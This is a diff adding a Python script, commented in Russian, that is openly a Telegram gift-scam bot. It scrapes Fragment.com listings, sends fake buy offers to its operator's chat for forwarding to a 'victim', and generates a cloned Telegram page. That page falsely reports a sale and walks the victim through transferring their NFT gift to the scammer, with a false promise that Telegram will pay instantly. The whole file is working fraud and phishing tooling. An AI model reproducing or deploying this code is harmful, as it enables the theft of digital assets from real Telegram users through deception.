@@ -1,0 +1,339 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+Telegram Gift Fake Offer Bot
+Мониторит Fragment.com/gifts, шлет фейковое уведомление в твой чат (TG_CHAT_ID).
+Ты пересылаешь его жертве. Кнопка "Принять" открывает gift_fake.html с экранами "успешно продан" и "как передать".
+"""
+
+import os
+import re
+import json
+import time
+import requests
+from datetime import datetime
+from dotenv import load_dotenv
+from urllib.parse import urlencode
+
+load_dotenv()
+
+# ================= КОНФИГ =================
+TG_TOKEN = os.getenv("TG_TOKEN")
+TG_CHAT_ID = os.getenv("TG_CHAT_ID")
+FAKE_HTML_URL = os.getenv("FAKE_HTML_URL", "https://твой-домен.com/gift_fake.html")
+CHECK_INTERVAL = int(os.getenv("CHECK_INTERVAL", "60"))
+SEEN_FILE = "seen_gifts.json"
+GIFT_IMG_BASE = os.getenv("GIFT_IMG_BASE", "https://img.icons8.com/color/256/000000/moon.png")
+FRAGMENT_URL = "https://fragment.com/gifts"
+
+# ================= МОНИТОРИНГ FRAGMENT =================
+def load_seen():
+    try:
+        with open(SEEN_FILE, "r", encoding="utf-8") as f:
+            return set(json.load(f))
+    except Exception:
+        return set()
+
+def save_seen(seen):
+    with open(SEEN_FILE, "w", encoding="utf-8") as f:
+        json.dump(list(seen), f, ensure_ascii=False, indent=2)
+
+def fetch_new_gifts():
+    try:
+        resp = requests.get(FRAGMENT_URL, headers={
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Accept": "text/html,application/xhtml+xml",
+        }, timeout=15)
+        html = resp.text
+    except Exception as e:
+        print(f"[!] Ошибка запроса к Fragment: {e}")
+        return []
+
+    gifts = []
+    gift_matches = re.findall(r'/gift/([A-Za-z0-9_#-]+)', html)
+    seller_matches = re.findall(r'@([A-Za-z0-9_]{5,32})', html)
+    price_matches = re.findall(r'(\d+(?:\.\d+)?)\s*⭐', html)
+
+    for i, gift in enumerate(gift_matches[:10]):
+        seller = seller_matches[i] if i < len(seller_matches) else "noname"
+        price = price_matches[i] if i < len(price_matches) else "0"
+        gifts.append({
+            "gift": gift,
+            "seller": seller,
+            "price": price,
+            "time": datetime.now().strftime("%H:%M:%S")
+        })
+    return gifts
+
+# ================= ОТПРАВКА ФЕЙКОВОГО ОФФЕРА =================
+def send_fake_offer(chat_id, gift_name, gift_id, seller_name, price_stars, gift_img_url=None):
+    if not gift_img_url:
+        gift_img_url = GIFT_IMG_BASE
+
+    caption = (
+        f"🎁 <b>{gift_name}</b>\n\n"
+        f"Пользователь <b>{seller_name}</b> предлагает Вам "
+        f"<b>{price_stars} ⭐</b> за подарок\n"
+        f"<code>{gift_id}</code>\n\n"
+        f"<i>{datetime.now().strftime('%H:%M')}</i>"
+    )
+
+    params = urlencode({
+        "img": gift_img_url,
+        "seller": seller_name,
+        "price": price_stars,
+        "gift": gift_id
+    })
+    accept_url = f"{FAKE_HTML_URL}?{params}"
+
+    keyboard = {
+        "inline_keyboard": [[
+            {"text": "Отклонить", "callback_data": "decline"},
+            {"text": "Принять", "url": accept_url}
+        ]]
+    }
+
+    try:
+        r = requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/sendPhoto", data={
+            "chat_id": chat_id,
+            "photo": gift_img_url,
+            "caption": caption,
+            "parse_mode": "HTML",
+            "reply_markup": json.dumps(keyboard)
+        }, timeout=15)
+        return r.json()
+    except Exception as e:
+        print(f"[!] Ошибка отправки в Telegram: {e}")
+        return None
+
+# ================= HTML-КЛОН (встроен, сохраняет при запуске) =================
+HTML_CLONE = """<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Telegram — Moon Pendant #48365</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body { background: #0a0a0a; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; overflow-x: hidden; }
+    .tg-header { background: linear-gradient(180deg, #1a1a1a, #0f0f0f); border-bottom: 1px solid #2a2a2a; }
+    .tg-btn { background: #161616; border: 1px solid #333; color: #fff; transition: all 0.2s; }
+    .tg-btn:active { background: #2a2a2a; }
+    .accept-btn { background: linear-gradient(135deg, #00c851, #007e33); border: none; color: #fff; }
+    .accept-btn:active { filter: brightness(0.9); }
+    .decline-btn { background: linear-gradient(135deg, #ff3b30, #d63031); border: none; color: #fff; }
+    .decline-btn:active { filter: brightness(0.9); }
+    .play-btn { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 64px; height: 64px; background: rgba(255,255,255,0.9); border-radius: 50%; display: flex; align-items: center; justify-content: center; z-index: 10; cursor: pointer; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
+    .play-tri { width: 0; height: 0; border-left: 20px solid #000; border-top: 12px solid transparent; border-bottom: 12px solid transparent; margin-left: 4px; }
+    screen { display: none; animation: fadeIn 0.3s ease; }
+    screen.active { display: block; }
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+    .step-num { background: #161616; border: 1px solid #333; width: 28px; height: 28px; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; font-weight: bold; margin-right: 8px; flex-shrink: 0; }
+  </style>
+</head>
+<body class="text-gray-200 min-h-screen flex flex-col">
+
+  <div class="tg-header px-4 py-3 flex items-center justify-between">
+    <span class="text-green-400 font-medium">Telegram</span>
+    <span class="text-gray-500 text-sm" id="topTime">Сегодня</span>
+  </div>
+
+  <!-- ЭКРАН 1: первоначальное уведомление о предложении -->
+  <screen id="screen1" class="active flex-1">
+    <div class="bg-gray-900/80 backdrop-blur border border-gray-800 rounded-2xl mx-4 mt-4 overflow-hidden relative">
+      <div class="aspect-video gift-card relative p-8 flex items-center justify-center">
+        <img id="giftImg" src="" alt="Gift" class="w-full h-full object-contain mix-blend-screen filter brightness-150 contrast-125">
+        <div class="play-btn" onclick="showScreen(2)">
+          <div class="play-tri"></div>
+        </div>
+        <button class="absolute bottom-4 right-4 bg-black/40 backdrop-blur px-4 py-2 rounded-lg text-green-400 text-sm font-medium border border-green-500/30 hover:bg-green-500/20">
+          ПОКАЗАТЬ ПОДАРОК
+        </button>
+      </div>
+
+      <div class="p-6">
+        <div class="text-gray-400 text-sm mb-2">
+          Пользователь <span class="text-white font-semibold" id="seller">ccexw</span> предлагает Вам
+        </div>
+        <div class="text-2xl font-bold text-white mb-1 flex items-baseline gap-2">
+          <span id="price">1000.0</span><span class="text-xl text-yellow-400 ml-1">⭐</span>
+        </div>
+        <div class="text-gray-400 text-sm mb-4">
+          за подарок <span class="text-blue-400 font-medium" id="giftName">MoonPendant#48365</span>
+        </div>
+        <div class="text-xs text-gray-600 text-right" id="timeSmall">03:15</div>
+
+        <div class="flex gap-3 mt-6">
+          <button class="tg-btn decline-btn flex-1 py-4 rounded-xl font-medium text-lg shadow-lg" onclick="decline()">
+            Отклонить
+          </button>
+          <button class="tg-btn accept-btn flex-1 py-4 rounded-xl font-medium text-lg shadow-lg" onclick="showScreen(2)">
+            Принять
+          </button>
+        </div>
+      </div>
+    </div>
+  </screen>
+
+  <!-- ЭКРАН 2: "Успешно продан" -->
+  <screen id="screen2" class="flex-1">
+    <div class="bg-gray-900/80 backdrop-blur border border-gray-800 rounded-2xl mx-4 mt-4 overflow-hidden relative">
+      <div class="aspect-video gift-card relative p-8 flex items-center justify-center">
+        <img id="giftImg2" src="" alt="Gift" class="w-full h-full object-contain mix-blend-screen filter brightness-150 contrast-125">
+        <div class="play-btn" onclick="showScreen(3)">
+          <div class="play-tri"></div>
+        </div>
+        <button class="absolute bottom-4 right-4 bg-black/40 backdrop-blur px-4 py-2 rounded-lg text-green-400 text-sm font-medium border border-green-500/30 hover:bg-green-500/20">
+          ПОКАЗАТЬ ПОДАРОК
+        </button>
+      </div>
+
+      <div class="p-6 space-y-4">
+        <div class="flex items-center gap-2 text-green-400 font-semibold">
+          <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/></svg>
+          Подарок: <span id="soldGiftName">MoonPendant#48365</span> успешно продан!
+        </div>
+
+        <div class="bg-gray-800/50 rounded-xl p-4 border border-gray-700">
+          <div class="flex items-center gap-2 mb-1">
+            <svg class="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20"><path d="M12 17.27L18.25 21l0.5-0.97L15.5 13h2.25l-2.13-2.13L18.25 6l0.5-0.97L15.5 3h-2.25l-1.46 1.46L10 0.54 8.46 4.57 7 6H4.75l0.5 0.97L4.5 13H2.25l2.13 2.13L1.75 21l0.5 0.97L12 17.27z"/></svg>
+            Передайте подарок покупателю для зачисления
+          </div>
+          <div class="text-2xl font-bold text-white mb-2 flex items-baseline gap-1">
+            <span id="soldPrice">1000.0</span><span class="text-xl text-yellow-400 ml-1">⭐</span>
+          </div>
+          <div class="flex items-center gap-2 text-sm text-gray-400">
+            <span>Передать NFT</span>
+            <span class="text-blue-400 font-mono" id="soldBuyer">@ccexw</span>
+          </div>
+        </div>
+
+        <div class="text-xs text-gray-600 text-right" id="soldTime">03:15</div>
+
+        <button class="w-full py-4 rounded-xl font-medium text-lg bg-gray-800 border border-gray-700 text-white hover:bg-gray-700" onclick="showScreen(3)">
+          Как передать
+        </button>
+      </div>
+    </div>
+  </screen>
+
+  <!-- ЭКРАН 3: инструкция "Как передать" -->
+  <screen id="screen3" class="flex-1">
+    <div class="bg-gray-900/80 backdrop-blur border border-gray-800 rounded-2xl mx-4 mt-4 overflow-hidden">
+      <div class="p-6">
+        <div class="text-gray-400 text-sm font-medium mb-4">Как передать подарок пользователю:</div>
+        <div class="text-blue-400 font-mono text-lg mb-6">@s <span id="instrBuyer">ccexw</span></div>
+
+        <div class="space-y-4 mb-6">
+          <div class="flex gap-3">
+            <div class="step-num">1</div>
+            <div class="text-gray-300">Передайте подарок пользователю: <span class="text-blue-400 font-mono" id="instrBuyer2">@s ccexw</span>.</div>
+          </div>
+          <div class="flex gap-3">
+            <div class="step-num">2</div>
+            <div class="text-gray-300">Нажмите «Передать NFT» и выберите <span class="text-blue-400 font-mono" id="instrGift">MoonPendant#48365</span>.</div>
+          </div>
+          <div class="flex gap-3">
+            <div class="step-num">3</div>
+            <div class="text-gray-300">Подтвердите передачу подарка.</div>
+          </div>
+        </div>
+
+        <div class="bg-gray-800/50 rounded-xl p-4 border border-gray-700 mb-6">
+          <div class="text-gray-400 text-sm">
+            Telegram зафиксирует транзакцию и моментльно зачислит оплату на ваш баланс. Резерв действует 24 часа.
+          </div>
+          <div class="text-xs text-gray-600 text-right mt-2" id="instrTime">03:15</div>
+        </div>
+
+        <button class="w-full py-4 rounded-xl font-medium text-lg bg-gray-800 border border-gray-700 text-white hover:bg-gray-700" onclick="showScreen(2)">
+          Вернуться к передаче
+        </button>
+      </div>
+    </div>
+  </screen>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const giftImg = params.get('img') || 'https://img.icons8.com/color/256/000000/moon.png';
+    const seller = params.get('seller') || 'ccexw';
+    const price = params.get('price') || '1000.0';
+    const gift = params.get('gift') || 'MoonPendant#48365';
+    const now = new Date();
+    const timeStr = now.toLocaleTimeString('ru-RU', {hour: '2-digit', minute:'2-digit'});
+
+    document.getElementById('giftImg').src = giftImg;
+    document.getElementById('giftImg2').src = giftImg;
+    document.getElementById('seller').textContent = seller;
+    document.getElementById('price').textContent = price;
+    document.getElementById('giftName').textContent = gift;
+    document.getElementById('timeSmall').textContent = timeStr;
+    document.getElementById('topTime').textContent = timeStr;
+
+    document.getElementById('soldGiftName').textContent = gift;
+    document.getElementById('soldPrice').textContent = price;
+    document.getElementById('soldBuyer').textContent = '@' + seller;
+    document.getElementById('soldTime').textContent = timeStr;
+
+    document.getElementById('instrBuyer').textContent = seller;
+    document.getElementById('instrBuyer2').textContent = '@' + seller;
+    document.getElementById('instrGift').textContent = gift;
+    document.getElementById('instrTime').textContent = timeStr;
+
+    function showScreen(n) {
+      document.querySelectorAll('screen').forEach(s => s.classList.remove('active'));
+      document.getElementById('screen' + n).classList.add('active');
+    }
+
+    function decline() {
+      alert('Подарок отклонён.');
+    }
+  </script>
+</body>
+</html>"""
+
+def save_html_clone(path="gift_fake.html"):
+    with open(path, "w", encoding="utf-8") as f:
+        f.write(HTML_CLONE)
+    print(f"[+] HTML-клон сохранён: {path}")
+
+# ================= ОСНОВНОЙ ЦИКЛ =================
+def main():
+    if not TG_TOKEN or not TG_CHAT_ID:
+        print("[!] Установи TG_TOKEN и TG_CHAT_ID в .env")
+        return
+
+    save_html_clone()
+    seen = load_seen()
+    print(f"[*] Бот запущен. Мониторинг каждые {CHECK_INTERVAL} сек...")
+    print(f"[*] Чат: {TG_CHAT_ID}")
+    print(f"[*] HTML URL: {FAKE_HTML_URL}")
+    print(f"[*] Пересылай сообщения от бота жертве вручную")
+
+    while True:
+        try:
+            gifts = fetch_new_gifts()
+            for g in gifts:
+                key = f"{g['gift']}:{g['seller']}"
+                if key not in seen:
+                    seen.add(key)
+                    save_seen(seen)
+                    print(f"[{g['time']}] Новый подарок: {g['gift']} от @{g['seller']} за {g['price']} ⭐")
+                    res = send_fake_offer(
+                        chat_id=TG_CHAT_ID,
+                        gift_name=g["gift"],
+                        gift_id=g["gift"],
+                        seller_name=g["seller"],
+                        price_stars=g["price"],
+                        gift_img_url=GIFT_IMG_BASE
+                    )
+                    if res and res.get("ok"):
+                        print(f"[+] Фейк отправлен в твой чат. Перешли его жертве.")
+                    else:
+                        print(f"[!] Ошибка отправки: {res}")
+        except Exception as e:
+            print(f"[!] Ошибка в цикле: {e}")
+        time.sleep(CHECK_INTERVAL)
+
+if __name__ == "__main__":
+    main()
